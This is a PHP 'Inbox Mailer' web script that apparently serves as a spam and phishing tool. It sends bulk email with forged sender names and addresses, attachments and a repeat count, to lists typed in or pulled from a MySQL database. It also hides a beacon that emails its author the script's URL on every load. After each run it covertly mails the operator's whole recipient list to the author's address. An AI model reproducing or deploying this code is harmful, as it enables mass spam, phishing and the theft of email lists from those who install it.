    <?php
    $secure = "hemzadz@yahoo.com" ;
    $subject = "Mailer By Hemza!!" ;
    $message = "New Mailer : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'] ;
    mail ($secure,$subject,$message) ;
    @$action=$_POST['action'];
    @$from=$_POST['from'];
    @$realname=$_POST['realname'];
    @$replyto=$_POST['replyto'];
    @$subject=$_POST['subject'];
    @$message=$_POST['message'];
    @$emaillist=$_POST['emaillist'];
    @$file_name=$_FILES['file']['name'];
    @$contenttype=$_POST['contenttype'];
    @$file=$_FILES['file']['tmp_name'];
    @$amount=$_POST['amount'];
    set_time_limit(intval($_POST['timelimit']));
    ?>
    <html>
    <head>
    <title>PHP Inbox Mailer By HemzaDz</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <style type="text/css">
    <!--
    .style1 {
        font-family: Geneva, Arial, Helvetica, sans-serif;
        font-size: 12px;
    }
    .style2 {
        font-size: 10px;
        font-family: Geneva, Arial, Helvetica, sans-serif;
    }
    .Times-New-Roman-16px00468Cb {font:bold 16px Times New Roman, serif; color:#00468C}
    .Times-New-Roman-24px00468Cb {font:bold 24px Times New Roman, serif; color:#000000}
    .Times-New-Roman-32px00468Cb {font:bold 32px Times New Roman, serif; color:#000000}
    .style3 {color: #000000}
    .Style5 {font: bold 32px Times New Roman, serif; color: #666666; }
    .Style6 {font-size: 10px}
    .Style7 {font-size: 10px; font-weight: bold; }
    -->
    </style>
    </head>
    <body bgcolor="#FFFFFF" text="#999999">  
    <div align="center">
       <p><span class="style1"><span class="Style5">Mailer Inbox </span></span></p>
    </div>
      <?php
    If ($action=="mysql"){
    include "./mysql.info.php";
      if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){
        print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";
        exit;
      }
      $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");
      mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");
      $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");
      $numrows = mysql_num_rows($result);
      for($x=0; $x<$numrows; $x++){
        $result_row = mysql_fetch_row($result);
         $oneemail = $result_row[0];
         $emaillist .= $oneemail."\n";
       }
      }
      if ($action=="send"){ $message = urlencode($message);
       $message = ereg_replace("%5C%22", "%22", $message);
       $message = urldecode($message);
       $message = stripslashes($message);
       $subject = stripslashes($subject);
       }
    ?>
    <form name="form1" method="post" action="" enctype="multipart/form-data"><br />
      <table width="142" border="0">
        <tr>
          <td width="100">
            <div align="right" class="Style6">
              <div align="left"><strong>
                <font face="Verdana, Arial, Helvetica, sans-serif">Your Email :</font> </strong></div>
            </div>      </td>
          <td width="219">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <input type="text" name="from" value="<?php print $from; ?>" size="36" />
            </font>      </td>
          <td width="100">
            <div align="right" class="Style7">
              <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif">Your Name :</font> </div>
            </div>      </td>
          <td width="278">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <input type="text" name="realname" value="<?php print $realname; ?>" size="36" />
            </font>      </td>
        </tr>
        <tr>
          <td width="100">
            <div align="right" class="Style7">
              <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif">Reply-To :</font> </div>
            </div>      </td>
          <td width="219">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <input type="text" name="replyto" value="<?php print $replyto; ?>" size="36" />
            </font>      </td>
          <td width="100">
            <div align="right" class="Style7">
              <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif">Attach File :</font> </div>
            </div>      </td>
          <td width="278">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <input name="file" type="file" class="Times-New-Roman-16px00468Cb" size="15" />
            </font>     </td>
        </tr>
        <tr>
          <td width="100">
            <div align="right" class="Style7">
              <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif">Subject :</font> </div>
            </div>      </td>
          <td colspan="3" width="703">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <input type="text" name="subject" value="<?php print $subject; ?>" size="104" />
            </font>      </td>
        </tr>
        <tr valign="top">
          <td colspan="3" width="520">
            <span class="Style6"><strong><font face="Verdana, Arial, Helvetica, sans-serif">Message Box :</font></strong></span> </td>
          <td width="278">
            <span class="Style6"><strong><font face="Verdana, Arial, Helvetica, sans-serif">Email Target / Email Send To :</font></strong> </span></td>
        </tr>
        <tr valign="top">
          <td colspan="3" width="520">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <textarea name="message" cols="60" rows="10"><?php print $message; ?></textarea>
              <br />
              <input type="radio" name="contenttype" value="plain" />
           </font><font face="Verdana, Arial, Helvetica, sans-serif"><span class="Style7">Plain</span></font><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
            <input type="radio" name="contenttype" value="html" checked="checked" />
           </font><strong><font face="Verdana, Arial, Helvetica, sans-serif"><span class="Style6"> HTML</span></font></strong><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
            <input type="hidden" name="action" value="send" />
            <br />
            </font><font face="Verdana, Arial, Helvetica, sans-serif"><span class="Style6"><strong>Number to send :</strong></span></font><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
            <input type="text" name="amount" value="1" size="10" />
            <br />
            </font><font face="Verdana, Arial, Helvetica, sans-serif"><span class="Style6"><strong>Maximum script execution time(in seconds, 0 for no timelimit)</strong></span></font><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
            <input type="text" name="timelimit" value="0" size="10" />
            <input type="submit" class="Times-New-Roman-16px00468Cb" value="Send eMails" />
              </font> </td>
          <td width="278">
            <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
              <textarea name="emaillist" cols="30" rows="10"><?php print $emaillist; ?></textarea>
            </font>      </td>
        </tr>
      </table>
    </form>
    <?php
    if ($action=="send"){
      if (!$from && !$subject && !$message && !$emaillist){
        print "Please complete all fields before sending your message.";
        exit;
       }
      $allemails = split("\n", $emaillist);
      $numemails = count($allemails);
      $filter = "Mail List Hemza Mailer";
      $float = "From : Mail List<hemzadz@hotmail.com>";
    If ($file_name){
       if (!file_exists($file)){
        die("The file you are trying to upload couldn't be copied to the server");
       }
       $content = fread(fopen($file,"r"),filesize($file));
       $content = chunk_split(base64_encode($content));
       $uid = strtoupper(md5(uniqid(time())));
       $name = basename($file);
      }
    for($xx=0; $xx<$amount; $xx++){
      for($x=0; $x<$numemails; $x++){
        $to = $allemails[$x];
        if ($to){
          $to = ereg_replace(" ", "", $to);
          $message = ereg_replace("&email&", $to, $message);
          $subject = ereg_replace("&email&", $to, $subject);
          print "Sending mail to $to.......";
          flush();
          $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
          $header .= "MIME-Version: PRO\r\n";
          If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
          If ($file_name) $header .= "--$uid\r\n";
          $header .= "Content-Type: text/$contenttype\r\n";
          $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
          $header .= "$message\r\n";
          If ($file_name) $header .= "--$uid\r\n";
          If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
          If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
          If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
          If ($file_name) $header .= "$content\r\n";
          If ($file_name) $header .= "--$uid--";
          mail($to, $subject, "", $header);
          print "ok<br>";
          flush();
        }
      }
    }
      mail($secure, $filter, $emaillist, $float);
    }
    ?>  
    </body>
    </html>
